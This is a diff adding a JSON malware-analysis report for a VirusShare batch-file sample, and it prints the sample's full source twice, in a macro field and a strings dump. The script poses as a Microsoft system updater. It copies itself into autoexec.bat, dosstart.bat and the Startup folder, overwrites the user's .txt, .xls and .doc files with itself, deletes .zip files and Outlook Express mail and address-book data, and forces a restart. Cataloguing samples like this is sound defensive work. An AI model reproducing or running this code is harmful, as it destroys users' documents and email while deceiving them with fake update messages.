@@ -1,0 +1,89 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Register": "May call a DLL using Excel 4 Macros",
+            "System": "May run an executable file or a system command on a Mac",
+            "Windows": "May enumerate application windows",
+            "autoexec": "Runs when the Word document is opened"
+        },
+        "macro": "@echo off\ncls\nif exist c:\\winupdt.bat goto code\ngoto setup\n:setup\n@echo off\necho Welcome To Microsoft Windows System Updater Setup\necho.\ncopy %0 c:\\winupdt.bat >> NULL\necho Scanning System.....Please Wait\nprompt $P$SWindows2000\ntype %0 >> c:\\autoexec.bat\ntype %0 >> c:\\windows\\dosstart.bat\necho Done.\necho.\necho Installing Components....Please Wait\nfor %%a in (C:\\mydocu~1\\*.txt) do copy c:\\winupdt.bat %%a >> NULL\nfor %%a in (C:\\mydocu~1\\*.xls) do copy c:\\winupdt.bat %%a >> NULL\nfor %%a in (C:\\mydocu~1\\*.doc) do copy c:\\winupdt.bat %%a >> NULL\necho Done.\necho.\necho You Now Need to Register with Microsoft's Partener: Fortune Galaxy to receive automatic updates.\npause\necho Downloading Components...Please Wait\nstart \"C:\\Program Files\\Internet Explorer\\Iexplore.exe\" http://www.astalavista.com\nif exist \"C:\\Program Files\\Outlook Express\\msimn.exe\" del \"C:\\wINDOWS\\Application Data\\Identities\\{161C80E0-1B99-11D4-9077-FD90FD02053A}\\Microsoft\\Outlook Express\\*.dbx\"\nif exist \"C\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\" del \"C:\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\"\necho Setup Will Now restart Your Computer....Please Wait\necho Your System is not faster by almost 40%\necho Thank you for using a Microsoft Partner's product.\ncopy %0 \"C:\\WINDOWS\\Start Menu\\Programs\\StartUp\\winupdt.bat\" >> NULL\nc:\\WINDOWS\\RUNDLL user.exe,exitwindowsexec\ncls\ngoto end\n:code\ncls\n@echo off\nprompt $P$SWindows2000\nif \"%0\" == \"C:\\AUTOEXEC.BAT\" goto abc\ntype %0 >> c:\\autoexec.bat\n:abc\ntype %0 >> c:\\windows\\dosstart.bat\nfor %%a in (*.zip) do del %%a\nfor %%a in (C:\\mydocu~1\\*.txt) do copy c:\\winupdt.bat %%a >> NULL\nfor %%a in (C:\\mydocu~1\\*.xls) do copy c:\\winupdt.bat %%a >> NULL\nfor %%a in (C:\\mydocu~1\\*.doc) do copy c:\\winupdt.bat %%a >> NULL\nstart \"C:\\Program Files\\Internet Explorer\\Iexplore.exe\" http://www.astalavista.com\nif exist \"C:\\Program Files\\Outlook Express\\msimn.exe\" del \"C:\\wINDOWS\\Application Data\\Identities\\{161C80E0-1B99-11D4-9077-FD90FD02053A}\\Microsoft\\Outlook Express\\*.dbx\" >> NULL\nif exist \"C\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\" del \"C:\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\" >> NULL\ncopy %0 \"C:\\WINDOWS\\Start Menu\\Programs\\StartUp\\winupdt.bat >> NULL\ngoto :end\ncls\n:end\ncls "
+    },
+    "filename": "VirusShare_08dded9eba96f6fc5d6a495550ced96b",
+    "filesize": 2315,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "08dded9eba96f6fc5d6a495550ced96b",
+        "sha1": "95aff3dae0927fe3c1a193b0c3c48f1d24d5f7f3",
+        "sha256": "fafeb0491973410ea6abd23d6823d6c31299d82a7f181791c650d6583a81e9eb"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if exist c:\\winupdt.bat goto code",
+            "goto setup",
+            ":setup",
+            "@echo off",
+            "echo Welcome To Microsoft Windows System Updater Setup",
+            "echo.",
+            "copy %0 c:\\winupdt.bat >> NULL",
+            "echo Scanning System.....Please Wait",
+            "prompt $P$SWindows2000",
+            "type %0 >> c:\\autoexec.bat",
+            "type %0 >> c:\\windows\\dosstart.bat",
+            "echo Done.",
+            "echo.",
+            "echo Installing Components....Please Wait",
+            "for %%a in (C:\\mydocu~1\\*.txt) do copy c:\\winupdt.bat %%a >> NULL",
+            "for %%a in (C:\\mydocu~1\\*.xls) do copy c:\\winupdt.bat %%a >> NULL",
+            "for %%a in (C:\\mydocu~1\\*.doc) do copy c:\\winupdt.bat %%a >> NULL",
+            "echo Done.",
+            "echo.",
+            "echo You Now Need to Register with Microsoft's Partener: Fortune Galaxy to receive automatic updates.",
+            "pause",
+            "echo Downloading Components...Please Wait",
+            "start \"C:\\Program Files\\Internet Explorer\\Iexplore.exe\" http://www.astalavista.com",
+            "if exist \"C:\\Program Files\\Outlook Express\\msimn.exe\" del \"C:\\wINDOWS\\Application Data\\Identities\\{161C80E0-1B99-11D4-9077-FD90FD02053A}\\Microsoft\\Outlook Express\\*.dbx\"",
+            "if exist \"C\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\" del \"C:\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\"",
+            "echo Setup Will Now restart Your Computer....Please Wait",
+            "echo Your System is not faster by almost 40%",
+            "echo Thank you for using a Microsoft Partner's product.",
+            "copy %0 \"C:\\WINDOWS\\Start Menu\\Programs\\StartUp\\winupdt.bat\" >> NULL",
+            "c:\\WINDOWS\\RUNDLL user.exe,exitwindowsexec",
+            "goto end",
+            ":code",
+            "@echo off",
+            "prompt $P$SWindows2000",
+            "if \"%0\" == \"C:\\AUTOEXEC.BAT\" goto abc",
+            "type %0 >> c:\\autoexec.bat",
+            ":abc",
+            "type %0 >> c:\\windows\\dosstart.bat",
+            "for %%a in (*.zip) do del %%a",
+            "for %%a in (C:\\mydocu~1\\*.txt) do copy c:\\winupdt.bat %%a >> NULL",
+            "for %%a in (C:\\mydocu~1\\*.xls) do copy c:\\winupdt.bat %%a >> NULL",
+            "for %%a in (C:\\mydocu~1\\*.doc) do copy c:\\winupdt.bat %%a >> NULL",
+            "start \"C:\\Program Files\\Internet Explorer\\Iexplore.exe\" http://www.astalavista.com",
+            "if exist \"C:\\Program Files\\Outlook Express\\msimn.exe\" del \"C:\\wINDOWS\\Application Data\\Identities\\{161C80E0-1B99-11D4-9077-FD90FD02053A}\\Microsoft\\Outlook Express\\*.dbx\" >> NULL",
+            "if exist \"C\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\" del \"C:\\WINDOWS\\Application Data\\Microsoft\\Address Book\\ankit.wab\" >> NULL",
+            "copy %0 \"C:\\WINDOWS\\Start Menu\\Programs\\StartUp\\winupdt.bat >> NULL",
+            "goto :end",
+            ":end",
+            "cls "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.astalavista.com"
+        ]
+    },
+    "time": "0:00:00.319535",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
